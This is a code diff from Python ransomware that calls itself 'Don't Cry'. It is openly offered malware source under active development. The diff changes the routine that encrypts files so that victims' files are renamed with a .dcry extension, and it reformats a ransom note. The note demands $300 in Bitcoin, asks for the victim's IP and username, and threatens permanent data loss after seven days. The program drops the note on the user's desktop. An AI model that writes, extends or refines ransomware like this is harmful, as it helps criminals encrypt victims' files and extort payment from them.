@@ -248,7 +248,8 @@ def encrypt_file(path, key, chunk_size=268435456):
                 f.seek(offset)
                 f.write(encrypted_chunk)
             f.seek(0)
-            f.write(b"DON'T$CRY")
+            f.write(b"DCRY$")
+        os.rename(path, path + ".dcry")
     except:
         pass
 
@@ -268,7 +269,9 @@ def encrypt_directory(directory_path, key):
 
 
 def shutdown():
-    msg = """"Your files are encrypted!"
+    msg = """==================================================
+            Your files are encrypted!             
+==================================================
 
 Important!
 All of your important files have been encrypted by Don't Cry ransomware.
@@ -283,11 +286,12 @@ To get them back, you need to follow the instructions below.
 
 3. Instructions for payment:
 - Buy Bitcoin (BTC) and send $300 to the address: [Bitcoin Address Here]
-- After the transaction is confirmed, send an email to [Email Address Here] with your public IP (https://api.ipify.org) and username. You will then receive a decryption key to unlock your files.
+- After the transaction is confirmed, send an email to [Email Address Here] with your public IP (https://api.ipify.org) and username.
+- Then, you will then receive a decryption key to unlock your files.
 
 4. Warning!
-- If you don’t pay within 72 hours, the price will double.
-- If you don’t pay within 7 days, all your files will no longer be decryptable!!!
+- If you don't pay within 72 hours, the price will double.
+- If you don't pay within 7 days, all your files will no longer be decryptable!!!
 
 Don't Cry =}"""
     file_path = os.path.join(os.environ["USERPROFILE"], r"Desktop\README.txt")
